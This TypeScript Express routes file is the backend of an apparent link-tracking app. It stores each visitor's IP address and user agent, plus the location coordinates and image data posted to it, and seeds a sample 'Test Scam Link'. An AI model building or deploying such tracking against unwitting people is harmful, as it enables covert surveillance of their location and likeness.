import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import crypto from "crypto";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  app.get(api.links.list.path, async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (Array.isArray(ip)) ip = ip[0];
    if (typeof ip === 'string' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }
    
    const links = await storage.getTrackingLinks(ip as string);
    res.json(links);
  });

  app.get(api.links.get.path, async (req, res) => {
    const link = await storage.getTrackingLinkByToken(req.params.token);
    if (!link) {
      return res.status(404).json({ message: 'Tracking link not found' });
    }
    res.json(link);
  });

  app.post(api.links.create.path, async (req, res) => {
    try {
      const input = api.links.create.input.parse(req.body);
      const token = crypto.randomBytes(16).toString('hex');
      
      let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      if (Array.isArray(ip)) ip = ip[0];
      if (typeof ip === 'string' && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
      }
      
      const newLink = await storage.createTrackingLink({ 
        ...input, 
        token,
        createdByIp: ip as string 
      });
      res.status(201).json(newLink);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  app.get(api.captures.list.path, async (req, res) => {
    const linkId = Number(req.params.linkId);
    if (isNaN(linkId)) {
      return res.status(400).json({ message: "Invalid link ID" });
    }
    const capList = await storage.getCaptures(linkId);
    res.json(capList);
  });

  app.post(api.captures.create.path, async (req, res) => {
    try {
      const linkId = Number(req.params.linkId);
      if (isNaN(linkId)) {
        return res.status(400).json({ message: "Invalid link ID" });
      }

      // Automatically capture IP from request
      let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      if (Array.isArray(ip)) {
        ip = ip[0];
      }

      const userAgent = req.headers['user-agent'] || undefined;

      const input = api.captures.create.input.parse(req.body);
      
      const newCapture = await storage.createCapture({
        linkId,
        ipAddress: ip as string | undefined,
        userAgent,
        ...input,
      });
      
      res.status(201).json(newCapture);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
          field: err.errors[0].path.join('.'),
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  // Seed data function
  async function seedDatabase() {
    const links = await storage.getTrackingLinks();
    if (links.length === 0) {
      const token = crypto.randomBytes(16).toString('hex');
      const seedLink = await storage.createTrackingLink({
        name: "Test Scam Link",
        token
      });
      
      await storage.createCapture({
        linkId: seedLink.id,
        ipAddress: "192.168.1.1",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        latitude: "37.7749",
        longitude: "-122.4194",
        accuracy: "10",
        imageData: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=", // 1x1 transparent png
      });
    }
  }

  // Run the seed
  seedDatabase().catch(console.error);

  return httpServer;
}
